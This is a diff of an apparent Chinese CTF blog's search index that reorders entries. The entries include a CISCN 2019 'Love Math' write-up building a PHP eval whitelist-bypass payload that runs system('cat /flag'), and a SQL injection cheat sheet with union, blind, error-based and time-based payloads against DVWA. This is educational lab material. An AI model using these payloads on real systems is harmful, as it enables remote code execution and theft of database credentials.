@@ -1,6 +1,38 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>(CISCN 2019 初赛)Love Math</title>
+    <url>/2020/10/13/CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math/</url>
+    <content><![CDATA[<blockquote>
+<p>BUUCTF练习靶场：<a href="https://buuoj.cn/" title="BUUCTF">点击直达</a></p>
+</blockquote>
+<a id="more"></a>
+
+<hr>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><blockquote>
+<p>思路来自于某大佬的Writeup：<a href="https://blog.csdn.net/miuzzx/article/details/">https://blog.csdn.net/miuzzx/article/details/</a>    </p>
+</blockquote>
+<p>题目直接给出了源码  </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acos&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;帮你算出答案</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>GET传递的变量必须设置，不然就返回源码  </li>
+<li>变量长度不能等于或超过80  </li>
+<li>payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’</li>
+<li>payload中不能有不是$whitelist白名单里面的单词出现</li>
+</ol>
+<hr>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数，比如：  </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;&#39;system&#39;;</span><br><span class="line">$a(&#39;ls&#39;); &#x2F;&#x2F;返回当前文件所在目录信息</span><br></pre></td></tr></table></figure>
+<p>题目中有长度限制我们可以尝试构造$_GET[]然后在传入想用的exp，但是这里把中括号下划线禁用了，那么就得需要编码绕过了。<br>通过白名单我们看到了一些可能帮助我们编码绕过的函数：base_convert()，dechex()<br>base_convert()可以进行进制之间的转换，如： base_convert(“1001”2,10)是将二进制的1001转换为10进制。<br>dechex()则是将10进制转成16进制。<br>我们先来写下我们要构造的payload：  </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$_GET[a]($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat flag</span><br><span class="line">构造$_GET[a]和$_GET[b]，把a和b的值分别传入system和cat，这样$_GET[a]($_GET[b])就等于system(&#39;cat flag&#39;)了</span><br></pre></td></tr></table></figure>
+<p>但是中括号被禁用了，这时我们可以用花括号{}代替。<br>要构造的字符串为 _GET，php中有将16进制转成字符串的函数hex2bin()，那就需要想办法生成hex2bin。<br>可以用我们白名单中的base_convert函数生成hex2bin，36进制也就是base36中有字母和数字正好可以满足生成条件。<br>所以 base_convert(37907361743,10,36)=hex2bin。因为我们是要得到_GET所以就得用到另外一个函数dechex()将_GET的10进制转为16进制，再通过hex2bin转换为字符串。<br>所以_GET=base_convert(37907361743,10,36)(dechex(1598506324))。<br>现在已经可以构造出$_GET[]了，将上面的payload修改下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>WEB</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CG-CTF/x00</title>
     <url>/2020/10/05/CG-CTF-x00/</url>
     <content><![CDATA[<blockquote>
@@ -53,38 +85,6 @@
       </categories>
   </entry>
   <entry>
-    <title>(CISCN 2019 初赛)Love Math</title>
-    <url>/2020/10/13/CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math/</url>
-    <content><![CDATA[<blockquote>
-<p>BUUCTF练习靶场：<a href="https://buuoj.cn/" title="BUUCTF">点击直达</a></p>
-</blockquote>
-<a id="more"></a>
-
-<hr>
-<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><blockquote>
-<p>思路来自于某大佬的Writeup：<a href="https://blog.csdn.net/miuzzx/article/details/">https://blog.csdn.net/miuzzx/article/details/</a>    </p>
-</blockquote>
-<p>题目直接给出了源码  </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acos&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;帮你算出答案</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ol>
-<li>GET传递的变量必须设置，不然就返回源码  </li>
-<li>变量长度不能等于或超过80  </li>
-<li>payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’</li>
-<li>payload中不能有不是$whitelist白名单里面的单词出现</li>
-</ol>
-<hr>
-<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数，比如：  </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;&#39;system&#39;;</span><br><span class="line">$a(&#39;ls&#39;); &#x2F;&#x2F;返回当前文件所在目录信息</span><br></pre></td></tr></table></figure>
-<p>题目中有长度限制我们可以尝试构造$_GET[]然后在传入想用的exp，但是这里把中括号下划线禁用了，那么就得需要编码绕过了。<br>通过白名单我们看到了一些可能帮助我们编码绕过的函数：base_convert()，dechex()<br>base_convert()可以进行进制之间的转换，如： base_convert(“1001”2,10)是将二进制的1001转换为10进制。<br>dechex()则是将10进制转成16进制。<br>我们先来写下我们要构造的payload：  </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$_GET[a]($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat flag</span><br><span class="line">构造$_GET[a]和$_GET[b]，把a和b的值分别传入system和cat，这样$_GET[a]($_GET[b])就等于system(&#39;cat flag&#39;)了</span><br></pre></td></tr></table></figure>
-<p>但是中括号被禁用了，这时我们可以用花括号{}代替。<br>要构造的字符串为 _GET，php中有将16进制转成字符串的函数hex2bin()，那就需要想办法生成hex2bin。<br>可以用我们白名单中的base_convert函数生成hex2bin，36进制也就是base36中有字母和数字正好可以满足生成条件。<br>所以 base_convert(37907361743,10,36)=hex2bin。因为我们是要得到_GET所以就得用到另外一个函数dechex()将_GET的10进制转为16进制，再通过hex2bin转换为字符串。<br>所以_GET=base_convert(37907361743,10,36)(dechex(1598506324))。<br>现在已经可以构造出$_GET[]了，将上面的payload修改下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>WEB</category>
-      </categories>
-  </entry>
-  <entry>
     <title>CTF练习平台</title>
     <url>/2020/09/21/CTF%E9%9D%B6%E5%9C%BA%E5%90%88%E9%9B%86/</url>
     <content><![CDATA[<p>新手——进阶——writeup</p>
@@ -101,34 +101,6 @@
 ]]></content>
       <categories>
         <category>CTF</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>sql注入常见代码</title>
-    <url>/2020/09/21/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E4%BB%A3%E7%A0%81/</url>
-    <content><![CDATA[<p>sql注入</p>
-<a id="more"></a>
-<h3 id="常规注入（假设表中字段数为2）"><a href="#常规注入（假设表中字段数为2）" class="headerlink" title=" 常规注入（假设表中字段数为2）"></a><font color="#FF0000"> 常规注入（假设表中字段数为2）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">判断字段：order by 2</span><br><span class="line">Union联合查询:  union select 1,2  </span><br><span class="line">union select 1,(database()) ----数据库dvwa  </span><br><span class="line">union select 1,(select group_concat(table_name) from information_schema.columns where table_schema&#x3D;database()) ----表users,guestbook  </span><br><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’) ----字段 first_name,last_name,user,password  </span><br><span class="line">union select 1,(select group_concat(user,0x7e,password) from dvwa.users) ----查询出用户名与密码：admin、123456  </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">------数据库information_schema中需要记住的表：</span><br><span class="line">① Schemata表（存储该用户所有数据库的库名）需要记住该表中记录数据库库名的字段名为schema_name</span><br><span class="line">② Tables表（存储该用户创建的所有数据库的库名和表名）需要记住该表中记录数据库库名和表名的宇段名分别为table_schema和table_name</span><br><span class="line">③ columns表（存储该用户创建的所有数据库的库名、表名和宇段名）需要记住该表中记录数据库库名、表名和宇段名的字段名为table_schema、table_name和column_name</span><br><span class="line"></span><br><span class="line">一般用columns表查询，columns表存储着该用户的数据库名、表名、字段名的字段</span><br><span class="line">输出数量有限制时用limit，select (user,,0x7e,password) from dvwa.users limit 0,1</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="盲注（无sql语句错误回显）"><a href="#盲注（无sql语句错误回显）" class="headerlink" title=" 盲注（无sql语句错误回显）"></a><font color="#FF0000"> 盲注（无sql语句错误回显）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询时只返回查询成功的值和失败的值，不会像union查询那样回显sql语句错误。例如分别查询1,2,3 分别换回 小明，小红，小刚。查询1’,2’,3’返回空值或其他提示（非sql语句错误之类的提示）</span><br><span class="line"></span><br><span class="line">盲注判断语句：</span><br><span class="line">① 1’ and length(database())&gt;&#x3D;1# ----判断数据库名是否大于1，如果大于1返回正常查询1的结果，反之返回其他</span><br><span class="line">② 1’ and substr(database(),1,1)&#x3D;”d”# ----substr是截取的意思，其意思是截取database()的值，从第一个字符开始，每次只返回一个值（substr(database(),2,1) 表示从第二个字符开始，每次只返回一个值）</span><br><span class="line">④ 1’ and ord(substr(database(),1,1))&#x3D;97# ----截取database()的第一个值并转化为ASCII码</span><br><span class="line">⑤ 1’ and ascii(substr(database(),1,1))&#x3D;97# ----截取database()的第一个值并转化为ASCII码（与④一样）</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title=" 报错注入"></a><font color="#FF0000"> 报错注入</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">程序直接将错误信息输出到了页面上（也可使用union注入），可以利用报错注入获取数据。报错注入有多种格式，此处利用函数updatexml（）演示SQL语句获取user（）的值</span><br><span class="line">Sql语句：1’ and updatexml(l,concat(0x7e,(select use()），θx7e),1)#</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h3 id="时间注入（时间盲注）"><a href="#时间注入（时间盲注）" class="headerlink" title=" 时间注入（时间盲注）"></a><font color="#FF0000"> 时间注入（时间盲注）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构建错误sql查询语句时无返回查询失败的值，但是可以利用sleep()或benchmark（）等函数让MySQL的执行时间变长来进行sql注入</span><br><span class="line"></span><br><span class="line">时间盲注多与IF(expr1 ,expr2 ,expr3) 结合使用，此IF语句含义是：如果expr1是TRUE，则IF（）的返回值为expr2；否则返回值则为expr3。</span><br><span class="line">判断数据库库名长度的语句应为：</span><br><span class="line">① if(length(database())&gt;1,sleep(5),1) ----如果数据库库名的长度大于1，则MySQL查询休眠5秒，否则查询1</span><br><span class="line">② if(substr(database(),1, 1)&#x3D;’s’,sleep(5),1) ----如果数据库库名第一位是s，则MySQL查询休眠5秒，否则查询1</span><br></pre></td></tr></table></figure>
-
-<h3 id="本文未完，博主正在加班加点编写中…"><a href="#本文未完，博主正在加班加点编写中…" class="headerlink" title="本文未完，博主正在加班加点编写中…"></a>本文未完，博主正在加班加点编写中…</h3>]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>WEB</category>
       </categories>
   </entry>
   <entry>
@@ -194,6 +166,34 @@
 <p>关于00截断原理的一些思考：<a href="https://blog.csdn.net/zpy1998zpy/article/details/80545408?utm_medium=distribute.pc_relevant.none-task-blog-title-1&spm=1001.2101.3001.4242" title="CSDN">点击加载</a></p>
 </blockquote>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>WEB</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>sql注入常见代码</title>
+    <url>/2020/09/21/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E4%BB%A3%E7%A0%81/</url>
+    <content><![CDATA[<p>sql注入</p>
+<a id="more"></a>
+<h3 id="常规注入（假设表中字段数为2）"><a href="#常规注入（假设表中字段数为2）" class="headerlink" title=" 常规注入（假设表中字段数为2）"></a><font color="#FF0000"> 常规注入（假设表中字段数为2）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">判断字段：order by 2</span><br><span class="line">Union联合查询:  union select 1,2  </span><br><span class="line">union select 1,(database()) ----数据库dvwa  </span><br><span class="line">union select 1,(select group_concat(table_name) from information_schema.columns where table_schema&#x3D;database()) ----表users,guestbook  </span><br><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’) ----字段 first_name,last_name,user,password  </span><br><span class="line">union select 1,(select group_concat(user,0x7e,password) from dvwa.users) ----查询出用户名与密码：admin、123456  </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">------数据库information_schema中需要记住的表：</span><br><span class="line">① Schemata表（存储该用户所有数据库的库名）需要记住该表中记录数据库库名的字段名为schema_name</span><br><span class="line">② Tables表（存储该用户创建的所有数据库的库名和表名）需要记住该表中记录数据库库名和表名的宇段名分别为table_schema和table_name</span><br><span class="line">③ columns表（存储该用户创建的所有数据库的库名、表名和宇段名）需要记住该表中记录数据库库名、表名和宇段名的字段名为table_schema、table_name和column_name</span><br><span class="line"></span><br><span class="line">一般用columns表查询，columns表存储着该用户的数据库名、表名、字段名的字段</span><br><span class="line">输出数量有限制时用limit，select (user,,0x7e,password) from dvwa.users limit 0,1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="盲注（无sql语句错误回显）"><a href="#盲注（无sql语句错误回显）" class="headerlink" title=" 盲注（无sql语句错误回显）"></a><font color="#FF0000"> 盲注（无sql语句错误回显）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询时只返回查询成功的值和失败的值，不会像union查询那样回显sql语句错误。例如分别查询1,2,3 分别换回 小明，小红，小刚。查询1’,2’,3’返回空值或其他提示（非sql语句错误之类的提示）</span><br><span class="line"></span><br><span class="line">盲注判断语句：</span><br><span class="line">① 1’ and length(database())&gt;&#x3D;1# ----判断数据库名是否大于1，如果大于1返回正常查询1的结果，反之返回其他</span><br><span class="line">② 1’ and substr(database(),1,1)&#x3D;”d”# ----substr是截取的意思，其意思是截取database()的值，从第一个字符开始，每次只返回一个值（substr(database(),2,1) 表示从第二个字符开始，每次只返回一个值）</span><br><span class="line">④ 1’ and ord(substr(database(),1,1))&#x3D;97# ----截取database()的第一个值并转化为ASCII码</span><br><span class="line">⑤ 1’ and ascii(substr(database(),1,1))&#x3D;97# ----截取database()的第一个值并转化为ASCII码（与④一样）</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title=" 报错注入"></a><font color="#FF0000"> 报错注入</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">程序直接将错误信息输出到了页面上（也可使用union注入），可以利用报错注入获取数据。报错注入有多种格式，此处利用函数updatexml（）演示SQL语句获取user（）的值</span><br><span class="line">Sql语句：1’ and updatexml(l,concat(0x7e,(select use()），θx7e),1)#</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="时间注入（时间盲注）"><a href="#时间注入（时间盲注）" class="headerlink" title=" 时间注入（时间盲注）"></a><font color="#FF0000"> 时间注入（时间盲注）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构建错误sql查询语句时无返回查询失败的值，但是可以利用sleep()或benchmark（）等函数让MySQL的执行时间变长来进行sql注入</span><br><span class="line"></span><br><span class="line">时间盲注多与IF(expr1 ,expr2 ,expr3) 结合使用，此IF语句含义是：如果expr1是TRUE，则IF（）的返回值为expr2；否则返回值则为expr3。</span><br><span class="line">判断数据库库名长度的语句应为：</span><br><span class="line">① if(length(database())&gt;1,sleep(5),1) ----如果数据库库名的长度大于1，则MySQL查询休眠5秒，否则查询1</span><br><span class="line">② if(substr(database(),1, 1)&#x3D;’s’,sleep(5),1) ----如果数据库库名第一位是s，则MySQL查询休眠5秒，否则查询1</span><br></pre></td></tr></table></figure>
+
+<h3 id="本文未完，博主正在加班加点编写中…"><a href="#本文未完，博主正在加班加点编写中…" class="headerlink" title="本文未完，博主正在加班加点编写中…"></a>本文未完，博主正在加班加点编写中…</h3>]]></content>
       <categories>
         <category>CTF</category>
         <category>WEB</category>
